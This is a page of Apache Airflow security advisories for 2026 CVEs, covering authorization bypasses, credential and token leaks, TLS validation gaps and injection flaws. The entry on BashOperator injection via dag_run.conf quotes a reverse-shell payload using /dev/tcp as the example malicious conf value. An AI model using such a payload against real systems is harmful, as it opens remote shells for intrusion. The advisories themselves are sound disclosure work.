* Vincent55 (confirmed in original report sign-off) (finder)
* Aymane MAZGUITI – unclej4ck (finder)
* Ilyase Dehy – Albert (finder)
* Jarek Potiuk (remediation developer)


## BashOperator Jinja2 injection via dag_run.conf — low-privilege user pattern ## { #CVE-2026-42252 }

CVE-2026-42252 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-42252) [\[CVE json\]](./CVE-2026-42252.cve.json) [\[OSV json\]](./CVE-2026-42252.osv.json)



_Last updated: 2026-06-01T07:51:17.651Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.2


### Description

Apache Airflow&#x27;s official documentation at `core-concepts/dag-run.html` (&quot;Passing Parameters when triggering Dags&quot;) showed a verbatim `BashOperator(bash_command=&quot;echo value: {{ dag_run.conf[&#x27;conf1&#x27;] }}&quot;)` example without any quoting / sanitization warning. Dag authors who copied the pattern verbatim into deployments where users had `Dag.can_trigger` permission on the affected Dag (typical multi-team deployments, hosted offerings exposing a trigger API) could be exposed to shell-metacharacter injection via the `conf` field of the trigger API: an authenticated trigger user could supply `&quot;; bash -i &gt;&amp; /dev/tcp/.../9999 0&gt;&amp;1; #&quot;` as a `conf` value and reach an `os.exec` on the worker. This CVE covers the documentation correction in `apache/airflow` PR 64129 — the pattern in the docs example now includes explicit shell-quoting and a safety caveat. Affects deployments whose Dag code was modeled on the pre-correction docs example. Same class as the prior CVE-2025-50213 and CVE-2025-27018 documentation-pattern fixes. Users are advised to upgrade to `apache-airflow` 3.2.2 or later to pick up the corrected documentation shipped with the release.

### References
* https://github.com/apache/airflow/pull/64129
* https://lists.apache.org/thread/8f4sc0rfn154jprmnwtmlst4p9zfw3w7


### Credits
* anonymous (finder)
* Kevin Yang (sjyangkevin) (remediation developer)


## API authorization bypass: bulk TaskInstances allows cross-DAG mutation ## { #CVE-2026-41084 }

CVE-2026-41084 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-41084) [\[CVE json\]](./CVE-2026-41084.cve.json) [\[OSV json\]](./CVE-2026-41084.osv.json)



_Last updated: 2026-06-01T07:51:55.264Z_

### Affected

* Apache Airflow from 3.2.0 before 3.2.2


### Description

A bug in Apache Airflow&#x27;s bulk Task Instances API (`PATCH/DELETE /api/v2/dags/{dag_id}/dagRuns/{dag_run_id}/taskInstances`) evaluated authorization against the `dag_id` resolved from the URL path while operating on the `dag_id` / `dag_run_id` extracted from request-body entity fields. An authenticated UI/API user with edit permission on one Dag could mutate Task Instance state in any other Dag by keeping the authorized Dag&#x27;s ID in the URL path and naming the target Dag&#x27;s IDs in the request body entities. Affects deployments that rely on per-Dag edit-scope to keep Task Instance state isolated between teams. Users are advised to upgrade to `apache-airflow` 3.2.2 or later.

### References
* https://github.com/apache/airflow/pull/64288
* https://lists.apache.org/thread/w0hdcqfr71hf9rl1bwvpjs7q9yp1bldk


### Credits
* Pirikara (finder)
* GPK (gopidesupavan) (remediation developer)


## Elasticsearch task-log handler leaks credentials embedded in the host URL ## { #CVE-2026-41018 }

CVE-2026-41018 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-41018) [\[CVE json\]](./CVE-2026-41018.cve.json) [\[OSV json\]](./CVE-2026-41018.osv.json)



_Last updated: 2026-05-10T20:38:57.776Z_

### Affected

* Apache Airflow Providers Elasticsearch before 6.5.3


### Description

The Elasticsearch logging provider, when configured with a `host` URL that embeds credentials (for example `https://user:password@server.example.com:9200`), wrote the full host URL — including the embedded credentials — into task logs. Any user with task-log read permission could harvest the backend credentials. Users are advised to upgrade to `apache-airflow-providers-elasticsearch` 6.5.3 or later and, as a defense-in-depth measure, configure the backend credentials via a secret backend rather than embedding them in the `[elasticsearch] host` URL.

### References
* https://github.com/apache/airflow/pull/65349
* https://lists.apache.org/thread/wz5l58drprmwlv6jxnq466x24jqbbhp7


### Credits
* Aleksandr Sozinov (finder)
* Jarek Potiuk (remediation developer)


## JWT cookie missing Secure flag in JWTRefreshMiddleware behind HTTPS-terminating proxy ## { #CVE-2026-41017 }

CVE-2026-41017 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-41017) [\[CVE json\]](./CVE-2026-41017.cve.json) [\[OSV json\]](./CVE-2026-41017.osv.json)



_Last updated: 2026-06-01T07:52:32.340Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.2


### Description

Apache Airflow&#x27;s `JWTRefreshMiddleware` set the JWT auth cookie without the `Secure` flag, so deployments running the Airflow API server behind an HTTPS-terminating reverse proxy (e.g. nginx / Envoy / a managed load balancer that terminates TLS and forwards plaintext to the API server, the default cloud-native topology) would have the user&#x27;s session JWT replayed over any cleartext HTTP request to the same host. A network-positioned attacker (Wi-Fi MITM, hostile LAN, captive-portal proxy) could induce a logged-in user&#x27;s browser to issue an HTTP request to the deployment&#x27;s hostname and capture the JWT cookie out of that request, then replay it against the authenticated API. Affects deployments where the Airflow API server is reached through a TLS-terminating proxy and the cookie&#x27;s secure-by-default protection is load-bearing for session integrity. Users are advised to upgrade to `apache-airflow` 3.2.2 or later.

### References
* https://github.com/apache/airflow/pull/65348
* https://lists.apache.org/thread/9jx0sk49c1250zflx0q3clc717qgjdch


### Credits
* Ran (@eddieran) (finder)
* Jarek Potiuk (remediation developer)


## No certificate validation on SMTP STARTTLS connections (SMTP provider — split from #265) ## { #CVE-2026-41016 }

CVE-2026-41016 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-41016) [\[CVE json\]](./CVE-2026-41016.cve.json) [\[OSV json\]](./CVE-2026-41016.osv.json)



_Last updated: 2026-05-29T08:45:19.890Z_

### Affected

* Apache Airflow Providers SMTP from 2.0.0 before 3.0.0


### Description

Apache Airflow's SMTP provider `SmtpHook` called Python's `smtplib.SMTP.starttls()` without an SSL context, so no certificate validation was performed on the TLS upgrade. A man-in-the-middle between the Airflow worker and the SMTP server could present a self-signed certificate, complete the STARTTLS upgrade, and capture the SMTP credentials sent during the subsequent `login()` call. Users are advised to upgrade to the `apache-airflow-providers-smtp` version that contains the fix.

### References
* https://github.com/apache/airflow/pull/65346
* https://lists.apache.org/thread/gb202qy5r31bgdd3d51d7s5o1jh40kc4


### Credits
* Francis Bergin (@francisbergin) (finder)
* Jarek Potiuk (remediation developer)


## per-DAG RBAC bypass on /ui/partitioned_dag_runs endpoints ## { #CVE-2026-41014 }

CVE-2026-41014 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-41014) [\[CVE json\]](./CVE-2026-41014.cve.json) [\[OSV json\]](./CVE-2026-41014.osv.json)



_Last updated: 2026-06-01T07:53:50.879Z_

### Affected

* Apache Airflow from 3.2.0 before 3.2.2


### Description

The partitioned_dag_runs endpoints in the Airflow UI enforced only asset-level access control, not per-Dag authorization. An authenticated UI/API user with global Asset:read permission could enumerate partition run state, schedule configuration, and asset wiring for Dags they were not authorized to read. Affects deployments that rely on per-Dag read scoping while granting users broader Asset access. Users are advised to upgrade to `apache-airflow` 3.2.2 or later.

### References
* https://github.com/apache/airflow/pull/65344
* https://lists.apache.org/thread/12nbzwwby7g883w2j13gn7ny1545xob9


### Credits
* Yalguun Tumenkhuu (fg0x0) (finder)
* Jarek Potiuk (remediation developer)


## DAG authorization bypass on /ui/structure/structure_data ## { #CVE-2026-40963 }

CVE-2026-40963 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-40963) [\[CVE json\]](./CVE-2026-40963.cve.json) [\[OSV json\]](./CVE-2026-40963.osv.json)



_Last updated: 2026-06-01T07:54:32.443Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.2


### Description

The structure_data endpoint in the Airflow UI returned external dependency graph nodes for linked Dags without checking whether the caller had read permission on those linked Dags. An authenticated UI/API user authorized for one Dag could enumerate linked Dag IDs and dependency metadata for other Dags they were not authorized to read. Affects deployments that rely on per-Dag read scoping to keep Dag dependency topology private across teams. Users are advised to upgrade to `apache-airflow` 3.2.2 or later.

### References
* https://github.com/apache/airflow/pull/65342
* https://lists.apache.org/thread/s907bhsksc37m59f0loqjcp1ryobrr60


### Credits
* Masamune - Unit515 OPSWAT (finder)
* Jarek Potiuk (remediation developer)


## Open Redirect Bypass Vulnerability ## { #CVE-2026-40961 }

CVE-2026-40961 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-40961) [\[CVE json\]](./CVE-2026-40961.cve.json) [\[OSV json\]](./CVE-2026-40961.osv.json)



_Last updated: 2026-06-01T07:55:03.222Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.2


### Description

A bug in the login redirect route in Apache Airflow allowed authenticated users to craft URLs that bypassed the `is_safe_url` check, enabling redirection from a trusted Airflow domain to an attacker-controlled origin. Users are advised to upgrade to `apache-airflow` 3.2.2 or later. As a defense-in-depth mitigation, deployment operators can place Airflow behind a reverse proxy that strips off-domain `next=` query parameters before they reach the login endpoint.

### References
* https://github.com/apache/airflow/pull/65557
* https://lists.apache.org/thread/qmt8ksh7gty6b8hr9w294t94j36jdv1q


### Credits
* Fushuling@secsys (finder)
* RacerZ@secsys (finder)
* Aritra Basu (remediation developer)


## OAuth Login CSRF — Missing State Parameter in Keycloak Auth Manager ## { #CVE-2026-40948 }

CVE-2026-40948 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-40948) [\[CVE json\]](./CVE-2026-40948.cve.json) [\[OSV json\]](./CVE-2026-40948.osv.json)



_Last updated: 2026-04-19T23:44:07.936Z_

### Affected

* Apache Airflow Providers Keycloak from 0.0.1 before 0.7.0


### Description

The Keycloak authentication manager in `apache-airflow-providers-keycloak` did not generate or validate the OAuth 2.0 `state` parameter on the login / login-callback flow, and did not use PKCE. An attacker with a Keycloak account in the same realm could deliver a crafted callback URL to a victim's browser and cause the victim to be logged into the attacker's Airflow session (login-CSRF / session fixation), where any credentials the victim subsequently stored in Airflow Connections would be harvestable by the attacker. Users are advised to upgrade `apache-airflow-providers-keycloak` to 0.7.0 or later.

### References
* https://github.com/apache/airflow/pull/64114
* https://lists.apache.org/thread/kc0odpr70hbqhdb9ksnz42fkqz2xld9q


### Credits
* Haruki Oyama (Waseda University) (finder)


## Arbitrary File Read via Log Symlink following in FileTaskHandler ## { #CVE-2026-40861 }

CVE-2026-40861 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-40861) [\[CVE json\]](./CVE-2026-40861.cve.json) [\[OSV json\]](./CVE-2026-40861.osv.json)



_Last updated: 2026-06-01T07:55:36.142Z_

### Affected

* Apache Airflow before 3.2.2


### Description

A Dag author could either (a) create a symlink under their task&#x27;s log directory pointing to an arbitrary file readable by the API server process (read-path attack — e.g. `/etc/passwd` or `airflow.cfg`) or (b) supply a `task_id` containing `..` sequences accepted by the Task SDK&#x27;s `KEY_REGEX` (write-path attack), and in both cases the FileTaskHandler resolves the log path outside the configured `base_log_folder`, leaking or overwriting arbitrary files. Only affects deployments where the worker log folder is shared with the API server. Users are advised to upgrade to `apache-airflow` 3.2.2 or later. As a defense-in-depth mitigation, deploy the worker and API server with separate log volumes so that worker-controlled paths cannot reach the API server&#x27;s filesystem.

### References
* https://github.com/apache/airflow/pull/65325
* https://lists.apache.org/thread/823334db2559xjlwt59gpzjz47thnscl


### Credits
* Silas Boch (finder)
* Lakshmikanthan K (letchupkt) (finder)
* Jarek Potiuk (remediation developer)


## Assets graph view bypasses DAG level access control displaying unrelated topologies and all DAGs names to unauthorized users ## { #CVE-2026-40690 }

CVE-2026-40690 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-40690) [\[CVE json\]](./CVE-2026-40690.cve.json) [\[OSV json\]](./CVE-2026-40690.osv.json)



_Last updated: 2026-04-24T12:35:28.702Z_

### Affected

* Apache Airflow before 3.2.1


### Description

The asset dependency graph did not restrict nodes by the viewer's DAG read permissions: a user with read access to at least one DAG could browse the asset graph for any other asset in the deployment and learn the existence and names of DAGs and assets outside their authorized scope.<br><br>Users are recommended to upgrade to version 3.2.1, which fixes this issue.<br>

### References
* https://github.com/apache/airflow/pull/65273
* https://lists.apache.org/thread/bqt7y4g2cpj396b0sd20lv510ff19ndl


### Credits
* Saurabh (finder)
* Jarek Potiuk (remediation developer)


## Dags endpoint might provide access to otherwise inaccessible entities ## { #CVE-2026-38743 }

CVE-2026-38743 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-38743) [\[CVE json\]](./CVE-2026-38743.cve.json) [\[OSV json\]](./CVE-2026-38743.osv.json)



_Last updated: 2026-04-24T12:36:37.917Z_

### Affected

* Apache Airflow before 3.2.1


### Description

<p></p><span style="background-color: rgb(255, 255, 255);">The authenticated </span><code>/ui/dags</code><span style="background-color: rgb(255, 255, 255);">&nbsp;endpoint did not enforce per-DAG access control on embedded Human-in-the-Loop (HITL) and TaskInstance records: a logged-in Airflow user with read access to at least one DAG could retrieve HITL prompts (including their request parameters) and full TaskInstance details for DAGs outside their authorized scope. Because HITL prompts and TaskInstance fields routinely carry operator parameters and free-form context attached to a task, the leak widens visibility of DAG-run data beyond the intended per-DAG RBAC boundary for every authenticated user.<br></span><br>Users are recommended to upgrade to version 3.2.1 , which fixes this issue.

### References
* https://github.com/apache/airflow/pull/64822
* https://lists.apache.org/thread/sk2wj0x48o8qb4p7c47gvnhjbm0mg396


### Credits
* Jed Cunningham (finder)
* Kevin Yang (remediation developer)


## Authorization bypass in DagRun wait endpoint (XCom exposure) ## { #CVE-2026-34538 }

CVE-2026-34538 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-34538) [\[CVE json\]](./CVE-2026-34538.cve.json) [\[OSV json\]](./CVE-2026-34538.osv.json)



_Last updated: 2026-04-09T09:09:19.260Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.0


### Description

Apache Airflow versions 3.0.0 through 3.1.8 <span style="background-color: rgb(255, 255, 255);">DagRun wait endpoint returns XCom result values even to users who only have DAG Run read permissions, such as the Viewer role.<span style="background-color: rgb(255, 255, 255);">This behavior conflicts with the FAB RBAC model, which treats XCom as a separate protected resource, and with the security model documentation that defines the Viewer role as read-only.</span><br></span><br><span style="background-color: rgb(255, 255, 255);">Airflow uses the FAB Auth Manager to manage access control on a per-resource basis. The Viewer role is intended to be read-only by default, and the security model documentation defines Viewer users as those who can inspect DAGs without accessing sensitive execution results.</span><br><br>Users are recommended to upgrade to Apache Airflow 3.2.0 which resolves this issue.<br><br><br>

### References
* https://github.com/apache/airflow/pull/64415
* https://lists.apache.org/thread/9mq3msqhmgjwdzbr6bgthj4brb3oz9fl


### Credits
* selen (finder)
* Kevin Yang (remediation developer)


## Unsafe Deserialization via Legacy Serialization Keys (__type/__var) Bypass in XCom API ## { #CVE-2026-33858 }

CVE-2026-33858 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-33858) [\[CVE json\]](./CVE-2026-33858.cve.json) [\[OSV json\]](./CVE-2026-33858.osv.json)



_Last updated: 2026-04-13T14:36:29.251Z_

### Affected

* Apache Airflow from 3.1.8 before 3.2.0


### Description

<p>Dag Authors, who normally should not be able to execute code in the webserver context could craft XCom payload causing the webserver to execute arbitrary code. Since Dag Authors are already highly trusted, severity of this issue is Low.</p><br>Users are recommended to upgrade to Apache Airflow 3.2.0, which resolves this issue.<br><br><br><br>

### References
* https://github.com/apache/airflow/pull/64148
* https://lists.apache.org/thread/1npt3o2x81s0gw9tmfcv4n7p1z9hdmy0


### Credits
* wooseokdotkim (finder)
* Amogh Desai (remediation developer)


## DAG author RCE on webserver via unrestricted import_string() in BaseSerialization.deserialize() ## { #CVE-2026-33264 }

CVE-2026-33264 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-33264) [\[CVE json\]](./CVE-2026-33264.cve.json) [\[OSV json\]](./CVE-2026-33264.osv.json)



_Last updated: 2026-07-07T12:25:55.676Z_

### Affected

* Apache Airflow before 3.3.0


### Description

A bug in `BaseSerialization.deserialize()` allowed unrestricted `import_string()` of attacker-controlled class paths when the Scheduler / API Server loaded a serialized DAG: a DAG author could embed a malicious trigger into a DAG to gain remote code execution on the API Server / Scheduler process, crossing the Airflow security boundary that DAG-author code must never execute in those processes. Users are advised to upgrade to `apache-airflow` 3.3.0 or later. As a defense-in-depth mitigation, deployments where DAG-author trust is limited can restrict the `[core] allowed_deserialization_classes` config to a narrow allowlist.

### References
* https://github.com/apache/airflow/pull/66002
* https://github.com/apache/airflow/pull/68528
* https://lists.apache.org/thread/otvdw8qt2y7xy2n5nq9xby9ky4rf5ltj


### Credits
* Ziyu Lin (finder)
* bugbunny.ai (tool)
* intadd (GitHub handle: @intadd) (finder)
* K (finder)
* Amogh Desai (@amoghrajesh) (remediation developer)
* Jarek Potiuk (remediation developer)


## TLS Certificate Verification Disabled in Databricks Provider K8s Token Exchange ## { #CVE-2026-32794 }

CVE-2026-32794 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-32794) [\[CVE json\]](./CVE-2026-32794.cve.json) [\[OSV json\]](./CVE-2026-32794.osv.json)



_Last updated: 2026-03-30T21:43:36.022Z_

### Affected

* Apache Airflow Provider for Databricks from 1.10.0 before 1.12.0


### Description

<p>Improper Certificate Validation vulnerability in Apache Airflow Provider for Databricks. Provider code did not validate certificates for connections to Databricks back-end which could result in a man-of-a-middle attack that traffic is intercepted and manipulated or credentials exfiltrated w/o notice.</p><p>This issue affects Apache Airflow Provider for Databricks: from 1.10.0 before 1.12.0.</p><p>Users are recommended to upgrade to version 1.12.0, which fixes the issue.</p>

### References
* https://github.com/apache/airflow/pull/63704
* https://lists.apache.org/thread/hn17yqsgsdtl81llvhf80rkp53hnz5nb


### Credits
* Kai Aizen (reporter)
* Marcin Wojtyczka (remediation developer)


## 3.x - Nested Variable Secret Values Bypass Redaction via max_depth=1 ## { #CVE-2026-32690 }

CVE-2026-32690 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-32690) [\[CVE json\]](./CVE-2026-32690.cve.json) [\[OSV json\]](./CVE-2026-32690.osv.json)



_Last updated: 2026-04-18T02:36:09.517Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.0


### Description

Secrets in Variables saved as JSON dictionaries were not properly redacted - in case thee variables were retrieved by the user the secrets stored as nested fields were not masked.<br><br>If you do not store variables with sensitive values in JSON form, you are not affected. Otherwise please upgrade to Apache Airflow 3.2.0 that has the fix implemented<br><br>

### References
* https://github.com/apache/airflow/pull/63480
* https://lists.apache.org/thread/7rnzxofntcznqxnhsmjvvlvygwph7rn5


### Credits
* Nguyen Anh Binh [IA Lab – FPT University] (finder)
* Kevin Yang (remediation developer)


## Users with asset materialization permisssions could trigger Dags they had no access to ## { #CVE-2026-32228 }

CVE-2026-32228 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-32228) [\[CVE json\]](./CVE-2026-32228.cve.json) [\[OSV json\]](./CVE-2026-32228.osv.json)



_Last updated: 2026-04-18T02:42:30.328Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.0


### Description

UI / API User with asset materialize permission could trigger dags they had no access to.<br>Users are advised to migrate to Airflow version 3.2.0 that fixes the issue.

### References
* https://github.com/apache/airflow/pull/63338
* https://lists.apache.org/thread/s7c75txgt4qf2rofcn43szfwgcrzy0nj


### Credits
* Masamune - Unit515 OPSWAT (finder)
* Ahmad Abuzaid (finder)
* Pierre Jeambrun (remediation developer)


## JWT token appearing in logs ## { #CVE-2026-31987 }

CVE-2026-31987 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-31987) [\[CVE json\]](./CVE-2026-31987.cve.json) [\[OSV json\]](./CVE-2026-31987.osv.json)



_Last updated: 2026-04-16T17:49:35.608Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.0


### Description

JWT Tokens used by tasks were exposed in logs. This could allow UI users to act as Dag Authors. <br>Users are advised to upgrade to Airflow version that contains fix.<br><br>Users are recommended to upgrade to version 3.2.0, which fixes this issue. <br><br>

### References
* https://github.com/apache/airflow/pull/62964
* https://github.com/apache/airflow/issues/62428
* https://github.com/apache/airflow/issues/62773
* https://lists.apache.org/thread/pvsrtxzwo9xy6xgknmwslv4zrw70kt6g


### Credits
* unixengineer (finder)
* Jason Imison (finder)
* Pineapple (remediation developer)


## Exposing stack trace in case of constraint error ## { #CVE-2026-30912 }

CVE-2026-30912 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-30912) [\[CVE json\]](./CVE-2026-30912.cve.json) [\[OSV json\]](./CVE-2026-30912.osv.json)



_Last updated: 2026-04-18T02:41:53.492Z_

### Affected

* Apache Airflow before 3.2.0


### Description

In case of SQL errors, exception/stack trace of errors was exposed in API even if "api/expose_stack_traces" was set to false. That could lead to exposing additional information to potential attacker. Users are recommended to upgrade to Apache Airflow 3.2.0, which fixes the issue.

### References
* https://github.com/apache/airflow/pull/63028
* https://lists.apache.org/thread/tp6kz1hnfb3zsrrtg19myo8x5x80w8r9


### Credits
* Masamune - Unit515 OPSWAT (finder)
* Jason(Zhe-You) Liu (remediation developer)


## Execution API HITL Endpoints Missing Per-Task Authorization ## { #CVE-2026-30911 }

CVE-2026-30911 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-30911) [\[CVE json\]](./CVE-2026-30911.cve.json) [\[OSV json\]](./CVE-2026-30911.osv.json)



_Last updated: 2026-03-17T10:53:00.535Z_

### Affected

* Apache Airflow from 3.1.0 before 3.1.8


### Description

Apache Airflow versions 3.1.0 through 3.1.7 missing authorization vulnerability in the Execution API's Human-in-the-Loop (HITL) endpoints that allows any authenticated task instance to read, approve, or reject HITL workflows belonging to any other task instance.<br><br><br>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.<br><br>

### References
* https://github.com/apache/airflow/pull/62886
* https://lists.apache.org/thread/1rs2v7fcko2otl6n9ytthcj87cmsgx51


### Credits
* Kai Aizen (finder)
* Aritra Basu (remediation developer)


## Bad example of BashOperator shell injection via dag_run.conf ## { #CVE-2026-30898 }

CVE-2026-30898 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-30898) [\[CVE json\]](./CVE-2026-30898.cve.json) [\[OSV json\]](./CVE-2026-30898.osv.json)



_Last updated: 2026-04-18T02:40:37.049Z_

### Affected

* Apache Airflow before 3.2.0


### Description

An example of BashOperator in Airflow documentation suggested a way of passing dag_run.conf in the way that could cause unsanitized user input to be used to escalate privileges of UI user to allow execute code on worker. Users should review if any of their own DAGs have adopted this incorrect advice.<br>

### References
* https://github.com/apache/airflow/pull/64129
* https://lists.apache.org/thread/26zmhfj1t95c1hld2r14ho81nzh1bdc8


### Credits
* Peyton Kennedy (p80n-sec) from Endor Labs (finder)
* Kevin Yang (remediation developer)


## Path of session token in cookie does not consider base_url - session hijacking via co-hosted applications ## { #CVE-2026-28779 }

CVE-2026-28779 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-28779) [\[CVE json\]](./CVE-2026-28779.cve.json) [\[OSV json\]](./CVE-2026-28779.osv.json)



_Last updated: 2026-03-17T10:43:18.236Z_

### Affected

* Apache Airflow from 3.0.0 before 3.1.8


### Description

Apache Airflow versions 3.1.0 through 3.1.7&nbsp;<span style="background-color: rgb(255, 255, 255);">session token (_token) in cookies is set to path=/ regardless of the configured [webserver] base_url or [api] base_url.<br><p>This allows any application co-hosted under the same domain to capture valid Airflow session tokens from HTTP request headers, allowing full session takeover without attacking Airflow itself.</p></span>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.<br>

### References
* https://github.com/apache/airflow/pull/62771
* https://lists.apache.org/thread/r4n5znb8mcq14wo9v8ndml36nxlksdqb


### Credits
* Daniel Wolf (finder)
* Daniel Wolf (remediation developer)


## DAG authorization bypass ## { #CVE-2026-28563 }

CVE-2026-28563 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-28563) [\[CVE json\]](./CVE-2026-28563.cve.json) [\[OSV json\]](./CVE-2026-28563.osv.json)



_Last updated: 2026-03-17T10:54:55.864Z_

### Affected

* Apache Airflow from 3.0.0 before 3.1.8


### Description

Apache Airflow versions 3.1.0 through 3.1.7 /ui/dependencies endpoint returns the full DAG dependency graph without filtering by authorized DAG IDs. This allows an authenticated user with only DAG Dependencies permission to enumerate DAGs they are not authorized to view.<br><br><br>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.<br><br><br>

### References
* https://github.com/apache/airflow/pull/62046
* https://lists.apache.org/thread/dwzf62qg9z8wvfsjknpfd8bvtwghd49s


### Credits
* Masamune - Unit515 OPSWAT (finder)
* Shubham Raj (remediation developer)


## JWT Token Exposure in KubernetesExecutor Command-Line Arguments ## { #CVE-2026-27173 }

CVE-2026-27173 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-27173) [\[CVE json\]](./CVE-2026-27173.cve.json) [\[OSV json\]](./CVE-2026-27173.osv.json)



_Last updated: 2026-05-22T18:42:19.144Z_

### Affected

* Apache Airflow CNCF Kubernetes provider before 10.17.0


### Description

JWT tokens that were used by workers in Kubernetes Executors have been exposed to users who had read only access to Kuberentes Pods. This could allow users with just read-only access to perform actions that were only available to running tasks via Task SDK and potentially allow to modify state of Airflow Database for tasks.

### References
* https://github.com/apache/airflow/pull/60108
* https://lists.apache.org/thread/pk3m2z4s2rkmc0v6gh9hnch9spc6stqw


### Credits
* Nikolai Dvoinishnikov, Welltory (finder)
* Anton Kuznetsov, Welltory (finder)
* Anish Giri (remediation developer)


## Wildcard DagVersion Listing Bypasses Per‑DAG RBAC and Leaks Metadata ## { #CVE-2026-26929 }

CVE-2026-26929 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-26929) [\[CVE json\]](./CVE-2026-26929.cve.json) [\[OSV json\]](./CVE-2026-26929.osv.json)



_Last updated: 2026-03-17T10:54:03.388Z_

### Affected

* Apache Airflow from 3.0.0 before 3.1.8


### Description

Apache Airflow versions 3.0.0 through 3.1.7<span style="background-color: rgb(255, 255, 255);">&nbsp;FastAPI DagVersion listing API does not apply per-DAG authorization filtering when the request is made with dag_id set to "~" (wildcard for all DAGs). As a result, version metadata of DAGs that the requester is not authorized to access is returned.</span><br><br><br>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.<br><br><br>

### References
* https://github.com/apache/airflow/pull/61675
* https://lists.apache.org/thread/g5o6khx83jwqvdyn0mlyb0krt35cs9ss


### Credits
* Pierre Jeambrun (remediation developer)


## API extra-links triggers XCom deserialization/class instantiation (Airflow 3.1.5) ## { #CVE-2026-25917 }

CVE-2026-25917 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-25917) [\[CVE json\]](./CVE-2026-25917.cve.json) [\[OSV json\]](./CVE-2026-25917.osv.json)



_Last updated: 2026-04-17T20:19:53.511Z_

### Affected

* Apache Airflow before 3.2.0


### Description

Dag Authors, who normally should not be able to execute code in the webserver context could craft XCom payload causing the webserver to execute arbitrary code. Since Dag Authors are already highly trusted, severity of this issue is Low.<br><br>Users are recommended to upgrade to Apache Airflow 3.2.0, which fixes the issue.<br>

### References
* https://github.com/apache/airflow/pull/61641
* https://lists.apache.org/thread/6whgpkqbh12rvpfmvcg8b0vwlv4hq3po


### Credits
* Mahammad Huseynkhanli (finder)
* Amogh Desai (remediation developer)


## Apache Airflow AWS Auth Manager - Host Header Injection Leading to SAML Authentication Bypass ## { #CVE-2026-25604 }

CVE-2026-25604 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-25604) [\[CVE json\]](./CVE-2026-25604.cve.json) [\[OSV json\]](./CVE-2026-25604.osv.json)



_Last updated: 2026-03-09T10:39:37.628Z_

### Affected

* Apache Airflow Providers Amazon from 8.0.0 before 9.22.0


### Description

<p>In AWS Auth manager, the origin of the SAML authentication has been used as provided by the client and not verified against the actual instance URL.&nbsp;<br>This allowed to gain access to different instances with potentially different access controls by reusing SAML response from other instances.</p>You should upgrade to 9.22.0 version of provider if you use AWS Auth Manager.<br><br>

### References
* https://github.com/apache/airflow/pull/61368
* https://lists.apache.org/thread/spwwrsmwxod7fpttcd7n7zs46j839l77


### Credits
* Sungwuk Jung (finder)


## Sensitive Azure Service Bus connection string (and possibly other providers) exposed to users with view access ## { #CVE-2026-25219 }

CVE-2026-25219 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-25219) [\[CVE json\]](./CVE-2026-25219.cve.json) [\[OSV json\]](./CVE-2026-25219.osv.json)



_Last updated: 2026-04-15T13:14:51.470Z_

### Affected

* Apache Airflow before 3.1.8


### Description

The `access_key` and `connection_string` connection properties were not marked as sensitive names in secrets masker. This means that user with read permission could see the values in Connection UI, as well as when Connection was accidentaly logged to logs, those values could be seen in the logs. Azure Service Bus used those properties to store sensitive values. Possibly other providers could be also affected if they used the same fields to store sensitive data.<br><br>If you used Azure Service Bus connection with those values set or if you have other connections with those values storing sensitve values, you should upgrade Airflow to 3.1.8

### References
* https://github.com/apache/airflow/pull/61580
* https://github.com/apache/airflow/pull/61582
* https://lists.apache.org/thread/t4dlmqkn0njz4chk3g7mdgzb96y4ttqh


### Credits
* Saurabh Banawar (finder)


## Assigning single DAG permission leaked all DAGs Import Errors ## { #CVE-2026-24098 }

CVE-2026-24098 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-24098) [\[CVE json\]](./CVE-2026-24098.cve.json) [\[OSV json\]](./CVE-2026-24098.osv.json)



_Last updated: 2026-03-10T18:13:52.941Z_

### Affected

* Apache Airflow from 3.0.0 before 3.1.7


### Description

Apache Airflow versions 3.0.0 - 3.1.7, has vulnerability that allows authenticated UI users with permission to one or more specific Dags to view import errors generated by other Dags they did not have access to. <br><br>Users are advised to upgrade to 3.1.7 or later, which resolves this issue

### References
* https://github.com/apache/airflow/pull/60801
* https://lists.apache.org/thread/nx96435v77xdst7ls5lk57kqvqyj095x


### Credits
* Saurabh (finder)


## Airflow externalLogUrl Permission Bypass ## { #CVE-2026-22922 }

